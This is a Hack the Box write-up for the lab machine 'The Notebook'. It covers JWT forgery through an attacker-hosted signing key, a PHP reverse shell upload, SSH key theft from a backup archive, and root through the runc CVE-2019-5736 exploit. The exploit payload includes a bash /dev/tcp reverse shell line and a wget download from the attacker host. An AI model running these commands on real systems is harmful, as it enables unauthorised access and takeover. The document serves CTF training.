+++
author = "Nick"
categories = ["hack the box", "medium", "enum4linux", "JWT", "burpsuite", "docker", "runc", "reverse shell", "CVE-2019-5736"]
date = 2021-07-31T15:00:00Z
description = ""
draft = false
image = "__GHOST_URL__/content/images/2021/07/noetbook.png"
slug = "hack-the-box-the-notebook"
summary = "Welcome! Today's write-up is for the Hack the Box machine - The Notebook. This machine is listed as a medium difficulty Linux machine. It's pretty straight forward, so let's jump in"
tags = ["hack the box", "medium", "enum4linux", "JWT", "burpsuite", "docker", "runc", "reverse shell", "CVE-2019-5736"]
title = "Hack the Box - The Notebook"

+++


Welcome! Today's write-up is for the Hack the Box machine - The Notebook. This machine is listed as a medium difficulty Linux machine. It's pretty straight forward, so let's jump in.

As always, we start our enumeration with `nmap`. Here are our results:

```
Nmap scan report for 10.10.10.230
Host is up (0.053s latency).
Not shown: 65532 closed ports
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf (RSA)
|   256 e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 (ECDSA)
|_  256 c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b (ED25519)
80/tcp    open     http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: The Notebook - Your Note Keeper
10010/tcp filtered rxapi
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Nothing too crazy, only one obscure port - 10010. So we'll see what's being hosted on port 80.

When we visit the site, we see a basic landing page. We have two options, `Register` and `login`. When we click the register link, we are brought to a page to do just that.

![](/images/2021/07/image.png)

The login page is simliar as well.

![](/images/2021/07/image-1.png)

We don't see anything in the source for the pages, so we'll start some enumeration with `ffuf`. 

Command:
`ffuf -u http://10.10.10.230/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt`

We get back limited results.

```
login                   [Status: 200, Size: 1250, Words: 173, Lines: 31]
register                [Status: 200, Size: 1422, Words: 193, Lines: 33]
admin                   [Status: 403, Size: 9, Words: 1, Lines: 1]
logout                  [Status: 302, Size: 209, Words: 22, Lines: 4]
```

Now we'll load up `Burpsuite` and start looking at what the site is doing. Once we have that loaded up, we create an account. We now have access to a new section called Notes. During the authentication processes, we see an authentication cookie get passed:

![](/images/2021/07/image-2.png)

We know it's as `JWT` token due to it's formatting.

![](/images/2021/07/image-5.png)

The yellow portion is the `Header`, the green portion is the `payload` and the blue is the verification signature. 

Now if we take this data, and drop it into [JWT.io](https://jwt.io) we can see the decoded data:

![](/images/2021/07/image-6.png)

What's good is that we can see that the `privKey` value on the local machine. So we're going to try and create our own `JWT` token with an `admin_cap` variable set to `true`. There are a few ways to do this, in my case, quickly generating the value via the CLI was how I did it.

Commands:
`echo '{"typ":"JWT","alg":"RS256","kid":"http://10.10.14.15:7070/privKey.key"}' | base64`
The above will create our `Header` value on the token.

`echo '{"username":"bobbillby","email":"bob@rootflag.io","admin_cap":true}' | base64`
This will create the `Payload` value on the token.

Now we have two sets of token values, we need to create a key to match our signature portion.

Command:
`ssh-keygen -t rsa -b 4096 -m PEM -f privKey.key`

Then we can host that key on our local machine on the same ports:

Command:
`python -m SimpleHTTPServer 7070`

Now we can take our generated outputs from above, and paste them into JWT.io to get our proper admin cookie.

![](/images/2021/07/image-7.png)

Now armed with this value, we need to modify our current cookie session value. Simply open up our `Developer tools` and head over to the Storage tab. Here we can see the values of the cookies for this site:

![](/images/2021/07/image-8.png)

Let's add our new JWT token and refresh. We should now see an `Admin Panel` section in our header!

![](/images/2021/07/image-9.png)

In this section, we see that we can view notes and upload a file. This is probably where we're going to upload our reverse shell!

![](/images/2021/07/image-10.png)

I tend to always use [Pentest Monkey](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) shell. So, now we just upload it.

![](/images/2021/07/image-11.png)

Make sure you have a listener running before we view the file on the port you specified, otherwise you'll miss the connection.

![](/images/2021/07/image-12.png)

We then catch our shell! Awesome, a foothold. Now we need to start enumerating internally. We'll copy over `linpeas.sh` and see what we can find.

![](/images/2021/07/image-13.png)

We see an interesting entry in our `backups` location - `home.tar.gz`. So we'll view the contents of this file.

Command:
`tar -tvf home.tar.gz`

![](/images/2021/07/image-14.png)

We see an `.ssh` directory. So we're going to want to extract the files and copy the key to our local machine to see if it works.

Command:
`tar -xvf home.tar.gz -C /tmp/temp` <= We created this directory, you don't need to. You can use whatever path you want.

Now we can navigate to the .ssh key and snag our key.

![](/images/2021/07/image-15.png)

We can copy this over by whatever means you like. Then we try to `SSH` into the target as Noah using this key.

Commands:
`chmod 0400 noah-key`
`ssh -i noah-key noah@10.10.10.230`

Once we get in, we snag our `user.txt` flag!

![](/images/2021/07/image-16.png)

Now we're in as a user, we can enumerate a bit further with more priviledges. I always run `sudo -l` once I get onto a box, it usually has a good path forward.

![](/images/2021/07/image-17.png)

Since `linpeas.sh` is still on the machine, we'll re-run that to start. Shortly into the run, we find that `runc` is on the machine.

![](/images/2021/07/image-18.png)

Some googling around leads us to CVE-2019-5736. [Here's a run down](https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/) of the CVE. It's not too hard to find a PoC for this CVE, we have [one here](https://github.com/Frichetten/CVE-2019-5736-PoC). We do meet the requirements for this PoC, we have root access to a container. 

First let's clone the repo down to our machine.

Command:
`git clone https://github.com/Frichetten/CVE-2019-5736-PoC`

Now we need to modify the `main.go` file in order to modify the payload. We're going to give the payload a shell back to us:

`#!/bin/bash \n bash -i >& /dev/tcp/10.10.14.15/6969 0>&1`

Now we can rebuild the application.

Command:
`go build main.go`

Now we can host a file server in this location.

Command:
`python3 -m SimpleHTTPServer 80`

We now want to gain a shell into our `Docker` container.

Command:
`sudo /usr/bin/docker exec -it webapp-dev01 sh`

Now we'll download our compiled exploit.

Command:
`wget 10.10.14.15/main`

Now make it executable.

Command:
`chmod +x main`

Now we run the exloit.

Command:
`./main`

![](/images/2021/07/image-19.png)

Now to trigger this fully, we need to run another docker command, same as above.

Command:
`sudo /usr/bin/docker exec -it webapp-dev01 sh`

Once we run that, we should see our listener light up!

![](/images/2021/07/image-20.png)

There we have it, root access!

Another box down, semi-realistic as well. If you found the write-up useful, send some respect my way!

HTB Profile - https://app.hackthebox.eu/profile/95635



